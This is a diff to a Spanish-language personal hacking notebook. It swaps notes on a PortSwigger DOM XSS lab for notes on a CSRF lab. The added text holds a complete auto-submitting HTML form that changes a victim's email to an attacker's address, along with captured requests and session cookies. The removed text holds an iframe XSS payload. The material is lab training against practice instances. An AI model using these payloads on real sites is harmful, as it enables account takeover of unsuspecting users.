@@ -15,19 +15,13 @@
 *   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    SCRIPT:
-
-
-    $(window).on('hashchange', function(){
-        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + 
-    ')');
-        if (post) post.get(0).scrollIntoView();
-    });
+    
     ```
 
-    ![DOM-XSSenSelectorEventoHASHCHANGE](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/a170860c-2a92-4d05-ad6e-8c8978af4742)
+    ![CSRFenformulariodecambiodeMAIL](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/6771990f-c3cf-4478-91ce-4d69d87f3b8d)
 
-    * CONCLUSION: ENCONTRAMOS EN EL HTML DEL HOME EL SCRIPT QUE MANEJA EL SELECTOR JQUERY EN EL EVENTO HASHCHANGE.
+
+    * CONCLUSION: ENCONTRAMOS QUE EL FORMULARIO DE CAMBIO DE EMAIL ES VULNERABLE A CSRF POR LO QUE TRABAJAREMOS SOBRE SU SOLICITUD PARA HACER REALIZAR A UNA VICTIMA SIMULADA QUE REALIZE LA ACCION DE CAMBIAR SU EMAIL POR NUESTRO EMAIL MALISICOSO A TRAVES DE UN LINK CON HTML DE PAYLOAD QUE INDIQUE REALIZAR ESTA SOLICITUD DADO QUE NO LA VERIFICA POR EL CSRF.
 *   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
@@ -1539,13 +1533,36 @@
     ```
 
     * CONCLUSION:
-*   [x] PORTSWIGGER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
+*   [x] CHAT GPT👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    <iframe src="https://0a96001003dc9730810d5ce400eb00b6.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+    PAYLOAD que CON yavascript provoca solo el envio involuntario del cambio de mail por la victima:
+
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>P4IM0N-CSRF</title>
+    </head>
+    <body>
+        <h1>¡Ataque P4IM0N-CSRF!</h1>
+        <form action="https://0a8100d104f324c982ec70c4002500a5.web-security-academy.net/my-account/change- 
+        email" method="POST">
+            <input type="hidden" name="email" value="malisiosoP4IM0Nmalisioso@hotmail.com" />
+            
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+    </html>
     ```
 
-    * CONCLUSION:NO SE TERMINO DE COMPRENDER BIEN LA EJECUCION; PERO TUVIMOS QUE MANDAR ESTA CARGA UTIL DESDE NEUSTRO SERVIDOR MALISIOSO A LA VICTIMA Y A ESTA SE ELE EJECUTARIA LAS OPCIONES DE IMPRECION DE LA URL INDICADA EN SRC Y NADAD MAS; SE COMPLICO HASTA QUE AL FIN LO TOMO EL LABORATORIO, LUEGO DE PROBAR MUCHAS CARGAS POR NUESTRA CUENTA.
+    ![PAYLOAD-HTML-paraexplotarvulnerabilidadCSRFenformulariodecambioMAIL2](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/4c404e93-61bc-4993-a32f-6b21cbc452cc)
+
+
+    * CONCLUSION:CON EL PAYLODAD MONTADO EN NUESTRO SERVIDOR, Y EN SU HTML UN INPUT OCULTO QUE GIUARDA COMO VALOS NUESTRO MAIL DE ATACANTE Y UN SCRIPT BERVE PARA QUE CUANDO EL USUARIO REALIZE CLINK EN EL LINK ESTE SCRIPT SE EJECUTE REALIZANDO AUTOMATICAMENTE EL ENVIO DEL FORMULARIO SIN REQUERIR LA MANIPULACION DE LA VITIMA DIRECTAMENTE, POR ENDE DE FORMA INVOLUNTARIA LA VICTIMA TERMINA HACIENDO EL CAMBIO DE SU MAIL A MI MAIL MALISIOSO POR ESTA VULNERABILIDAD DE CSRF EN EL SITIO.
 *   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
@@ -1575,139 +1592,57 @@
 
 
 
-
-    GET /post?postId=5 HTTP/2
-    Host: 0a96001003dc9730810d5ce400eb00b6.web-security-academy.net
-    Cookie: session=hrpstTIw3ZNzjsMATxZisZXH5xrq9PVC
-    Cache-Control: max-age=0
-    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
-    Sec-Ch-Ua-Mobile: ?0
-    Sec-Ch-Ua-Platform: "Linux"
-    Upgrade-Insecure-Requests: 1
-    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-    Sec-Fetch-Site: same-origin
-    Sec-Fetch-Mode: navigate
-    Sec-Fetch-User: ?1
-    Sec-Fetch-Dest: document
-    Referer: https://0a96001003dc9730810d5ce400eb00b6.web-security-academy.net/
+    POST /my-account/change-email HTTP/2
+    Host: 0a8100d104f324c982ec70c4002500a5.web-security-academy.net
+    Cookie: session=Upn6chdSyxSaRVHPifDcrCKk7FLPAIpv
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate, br
-    Accept-Language: es-419,es;q=0.9,en;q=0.8
-
-
-
-
-
-    RESPONSE NORMAL:
-
-
-
-    HTTP/2 200 OK
-    Content-Type: text/html; charset=utf-8
-    Content-Length: 7088
-
-    <!DOCTYPE html>
-    <html>
-        <head>
-            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
-            <link href=/resources/css/labsBlog.css rel=stylesheet>
-            <title>DOM XSS in jQuery selector sink using a hashchange event</title>
-        </head>
-        <body>
-            <script src="/resources/labheader/js/labHeader.js"></script>
-            <div id="academyLabHeader">
-                <section class='academyLabBanner'>
-                    <div class=container>
-                        <div class=logo></div>
-                            <div class=title-container>
-                                <h2>DOM XSS in jQuery selector sink using a hashchange event</h2>
-                                <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ae00026033497c481d25bd20118000d.exploit-server.net'>Go to exploit server</a>
-                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event'>
-                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
-                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
-                                        <g>
-                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
-                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
-                                        </g>
-                                    </svg>
-                                </a>
-                            </div>
-                            <div class='widgetcontainer-lab-status is-notsolved'>
-                                <span>LAB</span>
-                                <p>Not solved</p>
-                                <span class=lab-status-icon></span>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-            </div>
-            <div theme="blog">
-                <section class="maincontainer">
-                    <div class="container is-page">
-                        <header class="navigation-header">
-                            <section class="top-links">
-                                <a href=/>Home</a><p>|</p>
-                            </section>
-                        </header>
-                        <header class="notification-header">
-                        </header>
-                        <div class="blog-post">
-                        <img src="/image/blog/posts/57.jpg">
-                        <h1>Swipe Left Please</h1>
-                        <p><span id=blog-author>Scott Com</span> | 12 February 2024</p>
-                        <hr>
-                        <p>I don&apos;t know if you&apos;ve ever been on a dating site, but if you&apos;re female I&apos;d suggest you don&apos;t waste your time. And trust me, if you think by paying for a subscription you&apos;ll get a better selection of potential suitors, think again.</p>
-                        <p>The gallery of images looks like those books they whip out in CSI, a book of mugshots so a witness can identify the perpetrator. Honestly, they all look like convicts, mostly serial killers. I physically recoiled when I started browsing through. I don&apos;t want to appear mean, but I&apos;m thinking if you&apos;re looking to attract a female; a shave, maybe a shower, would be the right step before taking that selfie. And what&apos;s with the ski wear? Head covered, eyes covered by goggles, what are they trying to hide? If they think they look worse than the others, and are in disguise, I don&apos;t want to invite them to take the ski gear off.</p>
-                        <p>I took an unflattering photo, not easy for me as I&apos;m a big fan of the beauty filter. But, I was only there to see what goes on behind the scenes. My profile information offered up the bare minimum to meet the required word count. And yet, within the space of 5 minutes, I&apos;d had 25 views, one message, and a wink. That to me screams desperate. Trust me, my profile didn&apos;t suggest I was much of a catch.</p>
-                        <p>I couldn&apos;t read the message, if I wanted to I needed to put my hand in my wallet. I was teased with the first few words. It read, &apos;I can&apos;t because I&apos;m on a free trial&apos;. What a tight ass. If you want to communicate with me, don&apos;t send me a message I can&apos;t read so I have to shell out the money.</p>
-                        <p>There was a small part of me that momentarily thought it was a little bit exciting, and I might find a knight in shining armor. But not to be, 8 minutes in and I deleted my account.</p>
-                        <div/>
-                        <hr>
-                        <h1>Comments</h1>
-                        <section class="comment">
-                            <p>
-                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            El Bow | 20 February 2024
-                            </p>
-                            <p>Could you do a blog on the needy? I want to show my husband he&apos;s always whining about nothing.</p>
-                            <p></p>
-                        </section>
-                        <section class="comment">
-                            <p>
-                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            Peg Up | 01 March 2024
-                            </p>
-                            <p>I can&apos;t say I&apos;m surprised you wrote this.</p>
-                            <p></p>
-                        </section>
-                        <hr>
-                        <section class="add-comment">
-                            <h2>Leave a comment</h2>
-                            <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
-                                <input required type="hidden" name="csrf" value="Uy0SoJbkY9bWyecJrRz9nESJsH3BfCuB">
-                                <input required type="hidden" name="postId" value="5">
-                                <label>Comment:</label>
-                                <textarea required rows="12" cols="300" name="comment"></textarea>
-                                        <label>Name:</label>
-                                        <input required type="text" name="name">
-                                        <label>Email:</label>
-                                        <input required type="email" name="email">
-                                        <label>Website:</label>
-                                        <input pattern="(http:|https:).+" type="text" name="website">
-                                <button class="button" type="submit">Post Comment</button>
-                            </form>
-                        </section>
-                        <div class="is-linkback">
-                            <a href="/">Back to Blog</a>
-                        </div>
-                    </div>
-                </section>
-                <div class="footer-wrapper">
-                </div>
-            </div>
-        </body>
-    </html>
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 26
+    Origin: https://0a8100d104f324c982ec70c4002500a5.web-security-academy.net
+    Referer: https://0a8100d104f324c982ec70c4002500a5.web-security-academy.net/my-account?id=wiener
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Te: trailers
+    
+    email=P4IM0N%40hotmail.com
+    
+    
+    
+    
+    
+    
+    REQUEST DEL USUARIO VICTIMA DEL PAYLOAD AL HACER CLICK AL LINK:
+    
+    
+    
+    
+    POST /my-account/change-email HTTP/2
+    Host: 0a8100d104f324c982ec70c4002500a5.web-security-academy.net
+    Cookie: session=EldoSHDpwT1T8gDu60u9vgof5sWDY09k; session=CFenbsEnUZ29kezAApYAYde97k2jkRTx
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 44
+    Origin: https://exploit-0a1900d004f6242982e16f4301c20011.exploit-server.net
+    Referer: https://exploit-0a1900d004f6242982e16f4301c20011.exploit-server.net/
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: cross-site
+    Te: trailers
+    
+    email=malisiosoP4IM0Nmalisioso%40hotmail.com
     ```
 
-    * CONCLUSION: NO SE OBSERVA NADA.
+    * CONCLUSION: NO SE OBSERVA NADA, DEL LADO EL CLIENTE SE VERIA SU MAIL CAMBIADO.
 *   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
     ```python
